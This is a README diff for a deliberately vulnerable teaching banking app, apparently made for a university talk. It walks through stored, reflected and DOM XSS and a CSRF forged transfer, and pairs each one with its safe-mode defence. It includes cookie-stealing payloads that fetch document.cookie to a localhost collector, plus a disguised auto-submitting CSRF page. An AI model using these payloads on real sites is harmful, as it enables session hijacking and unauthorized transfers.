@@ -1,9 +1,10 @@
 # MockBank
 
-A deliberately vulnerable web banking app used to demonstrate **XSS** and **CSRF**
-attacks, and the corresponding defenses, for a university security presentation.
+A deliberately vulnerable web banking app for demonstrating **XSS** (stored /
+reflected / DOM) and **CSRF** attacks — and the corresponding defenses — for
+a university security presentation. UI inspired by Monobank.
 
-> ⚠️ This app is intentionally insecure in `--mode=vulnerable` (the default).
+> ⚠️ Intentionally insecure in `--mode=vulnerable` (the default).
 > Do not expose it to any network you don't fully control.
 
 ---
@@ -13,7 +14,7 @@ attacks, and the corresponding defenses, for a university security presentation.
 - Node.js + Express
 - `express-session` (in-memory) + `cookie-parser`
 - No template engine, no frontend framework, no build step
-- Fonts: Syne + DM Sans (Google Fonts)
+- Font: Inter (Google Fonts)
 
 ---
 
@@ -35,11 +36,11 @@ Demo accounts (hardcoded, in-memory):
 
 | User  | Password  | Starting balance |
 |-------|-----------|-----------------:|
-| alice | alice123  |          $10,000 |
-| bob   | bob123    |           $5,000 |
+| vlad  | vlad123   |          10 000 ₴ |
+| misha | misha123  |           5 000 ₴ |
 
 The current mode is shown as a pill badge in the navbar
-(red = vulnerable, teal = safe).
+(orange = vulnerable, green = safe).
 
 ---
 
@@ -56,10 +57,11 @@ node attacker/xss-collector.js
 Open **http://localhost:4000** — this is the attacker's dashboard. It lists
 every cookie captured, auto-refreshing every 3 seconds.
 
-### 2. Log in as alice and inject the payload
+### 2. Log in and inject the payload
 
-1. Go to http://localhost:3000 and sign in as `alice / alice123`.
-2. Send a transfer to `bob` with any amount, and paste this into the **Note** field:
+1. Go to http://localhost:3000 and sign in as `vlad / vlad123`.
+2. Send a transfer to `misha` with any amount, and paste this into the
+   **Коментар** (note) field:
 
    ```html
    <script>fetch('http://localhost:4000/steal?c='+document.cookie)</script>
@@ -67,14 +69,12 @@ every cookie captured, auto-refreshing every 3 seconds.
 
 3. The transfer completes. The note is stored in the transaction history
    and rendered back on the dashboard **unescaped**.
-4. Now log in as `bob / bob123` and send another transfer to `alice` so bob's
-   dashboard shows the stored transaction — or just open alice's dashboard again.
-   Every time the dashboard renders, the injected `<script>` runs and
+4. Every time the dashboard renders, the injected `<script>` runs and
    `document.cookie` (including the session cookie, because
    `httpOnly: false` in vulnerable mode) is shipped to the attacker.
 5. Switch to the collector tab — the session cookie appears in the table.
 
-### Alternate payload (useful when `<script>` is hard to trigger):
+Alternate payload that doesn't need `<script>`:
 
 ```html
 <img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
@@ -85,70 +85,131 @@ every cookie captured, auto-refreshing every 3 seconds.
 - The session cookie has `httpOnly: false`, so `document.cookie` sees it.
 
 ### Fix (`--mode=safe`)
-- Every piece of user input passes through `escapeHtml()` before rendering.
-- The session cookie is set with `httpOnly: true` — JavaScript cannot read it
-  even if an XSS slips through.
-
-Restart the server in safe mode, repeat the injection — the payload now
-shows up as literal text and no cookie is exfiltrated.
+- All user input passes through `escapeHtml()` before rendering.
+- The session cookie is set with `httpOnly: true`.
+- CSP (`default-src 'self'`) also blocks the exfiltration `fetch()` to
+  `:4000` as a second line of defense.
 
 ---
 
-## Attack 2 — CSRF (forged transfer)
+## Attack 2 — Reflected XSS (GET /search)
 
-### 1. Log in as alice
+The search page reflects the `?q=` parameter back into the page.
 
-Go to http://localhost:3000, sign in as `alice / alice123`. **Keep the tab open**.
+### Demo payload
+
+Log in, then open:
+
+```
+http://localhost:3000/search?q=<script>alert('XSS')</script>
+```
+
+Or cookie-stealing variant:
+
+```
+http://localhost:3000/search?q=<script>fetch('http://localhost:4000/steal?c='+document.cookie)</script>
+```
+
+The "Результати пошуку для: …" line renders the query **raw** in vulnerable
+mode — the script executes. A real attacker delivers this link via email /
+messenger / malicious ad.
+
+### Fix (`--mode=safe`)
+- The query is passed through `escapeHtml()` before being rendered.
+- CSP blocks inline `<script>` execution even if escaping were missing.
+
+---
+
+## Attack 3 — DOM-based XSS (GET /profile)
+
+The profile page reads `location.hash` client-side and writes it into the
+DOM. The server never sees the payload — the entire attack happens in the
+browser.
+
+### Demo payload
+
+Log in, then open:
+
+```
+http://localhost:3000/profile#<img src=x onerror=alert(document.cookie)>
+```
+
+Vulnerable mode uses:
+
+```js
+document.getElementById('welcome').innerHTML =
+  'Привіт, ' + decodeURIComponent(location.hash.slice(1));
+```
+
+`innerHTML` parses the injected `<img>` → `onerror` fires → `alert` runs
+with the document cookie. Nothing in this round-trip ever touches the
+server, so server-side escaping wouldn't have helped.
+
+### Fix (`--mode=safe`)
+
+```js
+document.getElementById('welcome').textContent =
+  'Привіт, ' + decodeURIComponent(location.hash.slice(1));
+```
+
+`textContent` inserts the value as literal text — no HTML parsing, no
+script execution. CSP blocks inline event handlers (`onerror="…"`) as
+well.
+
+---
+
+## Attack 4 — CSRF (forged transfer)
+
+### 1. Log in as vlad
+
+Go to http://localhost:3000, sign in as `vlad / vlad123`. **Keep the tab open**.
 
 ### 2. Open the attacker page
 
-Open `attacker/csrf.html` directly in the **same browser** (either via
-`file://` or by double-clicking the file). It looks like a lottery /
-prize page.
+Open `attacker/csrf.html` directly in the **same browser** (via `file://`
+or double-click). It looks like a lottery / prize page.
 
 ### 3. Click "CLAIM MY PRIZE NOW"
 
-An attack-console overlay appears and walks through each step of the CSRF
-forgery (no CSRF token required → crafting forged request → submitting as
-victim). After ~5 seconds the hidden form auto-submits to
-`POST http://localhost:3000/transfer` with `to=bob, amount=5000`.
+An attack-console overlay walks through each step of the CSRF forgery
+(no CSRF token required → crafting forged request → submitting as victim).
+After ~5 seconds the hidden form auto-submits to
+`POST http://localhost:3000/transfer` with `to=misha, amount=5000`.
 
-Because the browser attaches alice's session cookie to the cross-origin POST
-(no CSRF token, no SameSite=Strict), the transfer succeeds. Alice returns
-to her dashboard to find $5,000 missing and a new transaction.
+Because the browser attaches vlad's session cookie to the cross-origin
+POST (no CSRF token, `sameSite` isn't `strict`), the transfer succeeds.
 
 ### Why it works
 - `POST /transfer` accepts any authenticated request — no CSRF token.
-- Session cookie is set with `sameSite: 'none'`, so it gets attached to
-  cross-origin POSTs.
+- Session cookie uses `sameSite: 'lax'`, which still permits top-level
+  form submissions from another origin.
 
 ### Fix (`--mode=safe`)
-- A per-session CSRF token is generated and embedded as a hidden `_csrf`
-  field in the transfer form.
+- A per-session CSRF token is embedded as a hidden `_csrf` field in the
+  transfer form.
 - `POST /transfer` rejects requests where `_csrf` is missing or doesn't
   match the session value (HTTP 403).
 - The session cookie is set with `sameSite: 'strict'`, so the browser
   refuses to send it on cross-origin requests in the first place.
 
-Restart in safe mode, log back in as alice, open `csrf.html`, and click the
+Restart in safe mode, log back in as vlad, open `csrf.html`, click the
 button — the request is blocked with *"CSRF token missing or invalid"*.
 
 ---
 
-## Browser note
+## Safe-mode defenses summary
 
-Modern Chrome will drop cookies with `SameSite=None` unless `Secure` is
-also set. For the CSRF demo to reproduce reliably on plain `http://localhost`,
-use **Firefox**, or launch Chrome with:
+| Concern                | Vulnerable                 | Safe                                              |
+|------------------------|----------------------------|---------------------------------------------------|
+| Note / query rendering | raw HTML                   | `escapeHtml()`                                    |
+| Profile hash handling  | `innerHTML`                | `textContent`                                     |
+| Session cookie         | `httpOnly: false`          | `httpOnly: true`                                  |
+| Cookie SameSite        | `lax`                      | `strict`                                          |
+| CSRF token             | none                       | per-session, validated on POST                    |
+| CSP header             | not sent                   | `default-src 'self'; script-src 'self'`           |
+| Mode badge             | 🟠 VULNERABLE              | 🟢 SAFE                                           |
 
-```bash
-# Chrome on macOS, with relaxed SameSite enforcement for the demo
-open -a "Google Chrome" --args \
-  --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
-```
-
-Safe mode works in any browser — the fix doesn't depend on cookie
-attributes being honored loosely.
+Flip between the two by restarting with / without `--mode=safe`.
 
 ---
 
@@ -156,16 +217,23 @@ attributes being honored loosely.
 
 ```
 mockbank/
-├── server.js                 entry; parses --mode, wires routes + session
+├── server.js                 entry; parses --mode, wires routes + session + CSP
 ├── routes/
 │   ├── auth.js               GET/POST /login, GET /logout
-│   └── transfer.js           GET /dashboard, POST /transfer (+ CSRF check)
+│   ├── transfer.js           GET /dashboard, POST /transfer (+ CSRF check)
+│   └── xss.js                GET /search (reflected), GET /profile (DOM)
 ├── views/
 │   ├── layout.js             shared HTML shell (nav, mode pill, theme)
-│   ├── dashboard.js          dashboard body (balance, form, tx table)
-│   └── escape.js             escapeHtml() — used only in safe mode
+│   ├── dashboard.js          balance + form + transactions
+│   ├── search.js             reflected-XSS vector view
+│   ├── profile.js            DOM-XSS vector view
+│   └── escape.js             escapeHtml() — used in safe mode
 ├── public/
-│   └── login.html            static login page
+│   ├── app.css               Monobank-inspired theme (shared)
+│   ├── login.html            static login page
+│   ├── login.js              login error display
+│   ├── profile-vulnerable.js innerHTML sink (vulnerable mode)
+│   └── profile-safe.js       textContent sink (safe mode)
 └── attacker/
     ├── csrf.html             "lottery" page with hidden auto-submit form
     └── xss-collector.js      :4000 server that logs captured cookies
@@ -173,14 +241,8 @@ mockbank/
 
 ---
 
-## What to compare in a live demo
+## Browser note (vulnerable mode only)
 
-| Concern            | Vulnerable                      | Safe                        |
-|--------------------|---------------------------------|-----------------------------|
-| Note rendering     | raw HTML                        | `escapeHtml()`              |
-| Session cookie     | `httpOnly: false`               | `httpOnly: true`            |
-| Cross-origin POST  | `sameSite: 'none'`              | `sameSite: 'strict'`        |
-| CSRF token         | none                            | per-session, validated      |
-| Mode badge         | 🔴 VULNERABLE                   | 🟢 SAFE                     |
-
-Flip between the two by restarting with / without `--mode=safe`.
+Plain `http://localhost` + `SameSite=None` + no `Secure` → Chrome drops the
+cookie. Vulnerable mode uses `SameSite=Lax` instead so login works cross-port
+and the CSRF demo still fires. Safe mode uses `SameSite=Strict` regardless.
